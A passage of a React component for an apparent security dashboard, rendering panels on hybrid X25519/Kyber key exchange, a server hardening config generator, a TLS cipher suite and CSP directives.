                    <span className="w-5 h-5 rounded-full bg-cyan-950 border border-cyan-800/60 flex items-center justify-center text-[11px]">2</span>
                    <span>Hybrid Public Key Encapsulation</span>
                  </div>
                  <p className="text-slate-400 text-[11px] leading-relaxed">
                    Combines classical ECDH (X25519) curve with Kyber-1024 public vector t = As + e. Double-armored against all threats.
                  </p>
                  <div className="p-2 rounded bg-slate-900 font-mono text-[10px] text-cyan-300">
                    Dual X25519 + Kyber Keying
                  </div>
                </div>

                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center gap-2 text-emerald-400 font-bold">
                    <span className="w-5 h-5 rounded-full bg-emerald-950 border border-emerald-800/60 flex items-center justify-center text-[11px]">3</span>
                    <span>256-Bit Shared Secret Derivation</span>
                  </div>
                  <p className="text-slate-400 text-[11px] leading-relaxed">
                    Decapsulates ciphertext vector u and derives high-entropy 256-bit AES-GCM session key immune to quantum period-finding algorithms.
                  </p>
                  <div className="p-2 rounded bg-slate-900 font-mono text-[10px] text-emerald-300">
                    K = SHA3-256(m || H(c))
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* TAB 4: SERVER HARDENING & WAF RULES GENERATOR */}
        {activeTabPanel === 'hardening' && (
          <div className="space-y-4">
            <div className="p-5 rounded-3xl bg-slate-900/90 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between pb-3 border-b border-slate-800 flex-wrap gap-2">
                <div>
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <FileCode className="w-4 h-4 text-emerald-400" />
                    <span>Automated Security Hardening & WAF Generator</span>
                  </h3>
                  <p className="text-xs text-slate-400">
                    Deployable server configurations implementing non-eval CSP, Kyber cipher suites, and anti-clickjacking headers
                  </p>
                </div>

                <div className="flex items-center gap-2">
                  <button
                    onClick={() => copyToClipboard(getHardeningConfig(), 'hardening_code')}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold cursor-pointer border border-slate-700"
                  >
                    {copiedKey === 'hardening_code' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>{copiedKey === 'hardening_code' ? 'Copied' : 'Copy Config'}</span>
                  </button>

                  <button
                    onClick={() => downloadConfig(getHardeningConfig(), `security-hardening-${hardeningFormat}.conf`)}
                    className="flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold shadow-sm cursor-pointer"
                  >
                    <Download className="w-3.5 h-3.5" />
                    <span>Download Snippet</span>
                  </button>
                </div>
              </div>

              {/* Format Toggle */}
              <div className="flex items-center gap-2">
                {[
                  { id: 'nginx', label: 'Nginx SSL' },
                  { id: 'cloudflare', label: 'Cloudflare WAF' },
                  { id: 'express', label: 'Express Helmet' },
                  { id: 'apache', label: 'Apache .htaccess' }
                ].map((fmt) => (
                  <button
                    key={fmt.id}
                    onClick={() => setHardeningFormat(fmt.id as any)}
                    className={`px-3 py-1 rounded-xl text-xs font-semibold cursor-pointer transition-colors ${
                      hardeningFormat === fmt.id
                        ? 'bg-emerald-600 text-white shadow-xs'
                        : 'bg-slate-950 text-slate-400 hover:text-white border border-slate-800'
                    }`}
                  >
                    {fmt.label}
                  </button>
                ))}
              </div>

              <pre className="p-4 rounded-2xl bg-slate-950 border border-slate-850 font-mono text-xs text-cyan-300 leading-relaxed overflow-x-auto whitespace-pre">
                {getHardeningConfig()}
              </pre>
            </div>
          </div>
        )}

        {/* TAB 5: CRYPTOGRAPHIC CIPHER SUITE */}
        {activeTabPanel === 'crypto' && (
          <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 space-y-4">
            <h3 className="text-sm font-bold text-white mb-2">Cryptographic Handshake Architecture</h3>
            <div className="space-y-3 font-mono text-xs">
              <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800">
                <span className="text-slate-400 block mb-1 text-[11px] uppercase tracking-wider font-sans">
                  Active Cipher Suite
                </span>
                <p className="text-emerald-300 font-bold">TLS_AES_256_GCM_SHA384 (X25519Kyber768Draft00)</p>
              </div>

              <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800">
                <span className="text-slate-400 block mb-1 text-[11px] uppercase tracking-wider font-sans">
                  Key Encapsulation Mechanism (KEM)
                </span>
                <p className="text-purple-300 font-bold">X25519 + Kyber-1024 (Module-Lattice-Based KEM)</p>
                <p className="text-[11px] font-sans text-slate-400 mt-1">
                  Protects symmetric session keys even against hypothetical cryptanalytically relevant quantum computers (CRQC).
                </p>
              </div>

              <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800">
                <span className="text-slate-400 block mb-1 text-[11px] uppercase tracking-wider font-sans">
                  Symmetric Encryption & Authentication
                </span>
                <p className="text-cyan-300 font-bold">AES-256-GCM (Galois/Counter Mode with 128-bit ICV)</p>
              </div>
            </div>
          </div>
        )}

        {/* TAB 6: CSP DIRECTIVES */}
        {activeTabPanel === 'csp' && (
          <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 space-y-4">
            <h3 className="text-sm font-bold text-white mb-2">Content Security Policy (CSP) Directives</h3>
            <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 font-mono text-xs text-slate-300 space-y-2">
              <p><span className="text-purple-400 font-bold">default-src</span> &apos;self&apos;;</p>
              <p><span className="text-purple-400 font-bold">script-src</span> &apos;self&apos; https://trusted.cdn.com &apos;wasm-unsafe-eval&apos;;</p>
              <p><span className="text-purple-400 font-bold">style-src</span> &apos;self&apos; &apos;unsafe-inline&apos; https://fonts.googleapis.com;</p>
              <p><span className="text-purple-400 font-bold">connect-src</span> &apos;self&apos; https://api.aksh.browser wss://quic.aksh.internal;</p>
              <p><span className="text-purple-400 font-bold">upgrade-insecure-requests</span>;</p>
              <p><span className="text-purple-400 font-bold">frame-ancestors</span> &apos;none&apos;;</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
